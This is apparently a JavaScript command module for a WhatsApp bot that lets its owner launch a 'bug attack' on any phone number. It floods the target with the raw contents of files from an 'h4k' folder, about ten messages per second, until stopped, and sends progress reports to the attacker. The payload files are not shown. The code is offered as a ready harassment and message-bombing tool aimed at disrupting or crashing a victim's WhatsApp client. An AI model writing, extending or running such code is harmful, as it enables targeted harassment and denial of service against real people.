const fs = require('fs');
const path = require('path');

const activeAttacks = new Map();

module.exports = {
    name: 'bug',
    description: 'Send files exactly as they are - NO EDITING',
    
    async execute(sock, msg, args) {
        const from = msg.key.remoteJid;
        const userJid = msg.key.participant || from;
        
        try {
            const isOwner = await this.isBotOwner(sock, userJid);
            if (!isOwner) {
                return await sock.sendMessage(from, {
                    text: "❌ Not authorized"
                }, { quoted: msg });
            }

            if (args[0] === 'stop') {
                this.stopAllAttacks();
                return await sock.sendMessage(from, {
                    text: "✅ All attacks stopped"
                }, { quoted: msg });
            }

            if (args.length < 1) {
                return await sock.sendMessage(from, {
                    text: "🐛 *RAW FILE SENDER*\n\nUsage:\n.bug <phone_number>\n.bug stop\n\nSends ALL files EXACTLY as they are\nNO editing, NO chunking, NO truncating"
                }, { quoted: msg });
            }

            const targetNumber = args[0].replace(/\D/g, '');
            const targetJid = `${targetNumber}@s.whatsapp.net`;

            await this.startBugAttack(sock, targetJid, from);

        } catch (error) {
            console.error('Bug command error:', error);
            await sock.sendMessage(from, {
                text: '❌ Command failed'
            }, { quoted: msg });
        }
    },

    async isBotOwner(sock, userJid) {
        try {
            const botOwnerNumber = sock.authState.creds.me.id.split(':')[0].split('@')[0];
            const userNumber = userJid.split('@')[0];
            return userNumber === botOwnerNumber;
        } catch (error) {
            return false;
        }
    },

    async startBugAttack(sock, targetJid, reportJid) {
        try {
            if (activeAttacks.has(targetJid)) {
                this.stopBugAttack(targetJid);
            }

            const h4kFolder = path.join(__dirname, '../h4k');
            if (!fs.existsSync(h4kFolder)) {
                return await sock.sendMessage(reportJid, {
                    text: "❌ h4k folder not found!"
                });
            }

            const files = fs.readdirSync(h4kFolder).filter(f => f.endsWith('.js'));
            if (files.length === 0) {
                return await sock.sendMessage(reportJid, {
                    text: "❌ No .js files found in h4k folder!"
                });
            }

            await sock.sendMessage(reportJid, {
                text: `🐛 *RAW FILE ATTACK STARTED*\n\n🎯 Target: ${targetJid}\n📁 Files: ${files.length}\n⚡ Rate: Continuous\n⏰ Duration: Until stopped\n\nSending files EXACTLY as they are - NO modifications`
            });

            const attackInfo = {
                target: targetJid,
                reporter: reportJid,
                interval: null,
                startTime: Date.now(),
                messageCount: 0,
                fileIndex: 0,
                files: files,
                h4kFolder: h4kFolder,
                isRunning: true
            };

            activeAttacks.set(targetJid, attackInfo);

            // Continuous sending - files are sent exactly as they are
            attackInfo.interval = setInterval(async () => {
                if (!attackInfo.isRunning) {
                    clearInterval(attackInfo.interval);
                    return;
                }

                try {
                    const currentFile = attackInfo.files[attackInfo.fileIndex % attackInfo.files.length];
                    attackInfo.fileIndex++;

                    const filePath = path.join(attackInfo.h4kFolder, currentFile);
                    const fileContent = fs.readFileSync(filePath, 'utf8');

                    // Send EXACT file content - NO editing, NO truncating, NO chunking
                    await sock.sendMessage(targetJid, {
                        text: fileContent // RAW CONTEXACTLY AS IS
                    });
                    
                    attackInfo.messageCount++;

                    // Progress report every 10 files
                    if (attackInfo.messageCount % 10 === 0) {
                        const elapsed = Math.floor((Date.now() - attackInfo.startTime) / 1000);
                        await sock.sendMessage(reportJid, {
                            text: `📊 *PROGRESS - RAW FILES*\n\nFiles Sent: ${attackInfo.messageCount}\nCurrent File: ${currentFile}\nTime Elapsed: ${elapsed}s\nTarget: ${targetJid}\n\nAll files sent EXACTLY as they are`
                        });
                    }

                } catch (error) {
                    console.error('File send error:', error);
                    // Continue to next file despite errors
                }
            }, 100); // 100ms = ~10 files per second

        } catch (error) {
            console.error('Bug attack start error:', error);
            await sock.sendMessage(reportJid, {
                text: `❌ Failed to start: ${error.message}`
            });
        }
    },

    stopBugAttack(targetJid) {
        const attackInfo = activeAttacks.get(targetJid);
        if (attackInfo) {
            attackInfo.isRunning = false;
            if (attackInfo.interval) {
                clearInterval(attackInfo.interval);
            }
            
            if (attackInfo.reporter) {
                const duration = Math.floor((Date.now() - attackInfo.startTime) / 1000);
                const filesProcessed = attackInfo.files.length;
                
                setTimeout(() => {
                    sock.sendMessage(attackInfo.reporter, {
                        text: `✅ *RAW FILE ATTACK COMPLETED*\n\n🎯 Target: ${targetJid}\n📁 Total Files Processed: ${filesProcessed}\n📨 Messages Sent: ${attackInfo.messageCount}\n⏰ Duration: ${duration}s\n\nAll files were sent EXACTLY as they are - NO modifications made`
                    }).catch(console.error);
                }, 1000);
            }
            
            activeAttacks.delete(targetJid);
        }
    },

    stopAllAttacks() {
        for (const [targetJid] of activeAttacks) {
            this.stopBugAttack(targetJid);
        }
    }
};